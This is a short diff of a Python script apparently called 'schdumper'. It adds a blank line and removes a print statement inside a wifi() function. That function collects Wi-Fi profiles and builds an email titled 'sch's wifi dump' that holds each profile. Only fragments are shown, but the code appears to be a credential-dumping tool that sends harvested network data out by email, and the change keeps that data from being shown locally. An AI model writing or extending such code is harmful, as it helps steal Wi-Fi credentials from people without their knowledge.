@@ -14,6 +14,7 @@ import os
 from tabulate import tabulate
 from urllib.request import urlopen
 
+
 #welcome to schdumper
 #wilkommen aus die schdumper
 #viteje ve schdumper
@@ -105,7 +106,6 @@ def wifi():
                 wifi_list.append(wifi_profile) 
 
     for x in range(len(wifi_list)):
-        print(wifi_list[x])
         subject = "sch's wifi dump"
         body = f"""
             {wifi_list[x]}
